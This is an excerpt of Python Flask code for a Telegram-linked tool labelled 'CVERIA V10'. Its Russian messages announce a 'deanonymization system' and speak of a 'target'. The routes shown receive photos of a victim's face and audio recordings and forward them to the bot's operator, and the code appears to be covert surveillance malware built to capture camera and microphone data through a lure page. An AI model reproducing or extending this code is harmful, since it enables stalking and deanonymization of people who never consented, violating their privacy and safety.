...
def home():
    ...
    <body style="background:#000;display:flex;justify-content:center;align-items:center;height:100vh;color:#fff;font-family:sans-serif;text-align:center;">
        <div style="padding:40px;border:1px solid #333;border-radius:20px;background:#050505;">
            <h1 style="margin:0 0 20px 0;letter-spacing:5px;color:#0088cc;">CVERIA V10</h1>
            <a href="/activate" style="padding:15px 30px;background:#0088cc;color:#fff;text-decoration:none;border-radius:10px;font-weight:bold;">ЗАПУСТИТЬ МОДУЛЬ</a>
        </div>
    </body>
    '''
...
def activate():
    if bot.set_webhook(url=f"https://{request.host}/{API_TOKEN}"):
        return "✅ СИСТЕМА ДЕАНОНИМИЗАЦИИ АКТИВИРОВАНА"
    return "❌ ОШИБКА"
...
def log_photo():
    ...
    if uid in db and f: bot.send_photo(db[uid]['owner'], f.read(), caption=f"📸 *ЛИЦО ТАРГЕТА* (ID: `{uid}`)", parse_mode="Markdown")
    return "ok"

@app.route('/log_audio', methods=['POST'])
def log_audio():
    uid, f = request.form.get('uid'), request.files.get('audio')
    if uid in db and f: bot.send_document(db[uid]['owner'], f.read(), caption=f"🎤 *РЕАКЦИЯ* (ID: `{uid}`)", parse_mode="Markdown")
    return "ok"
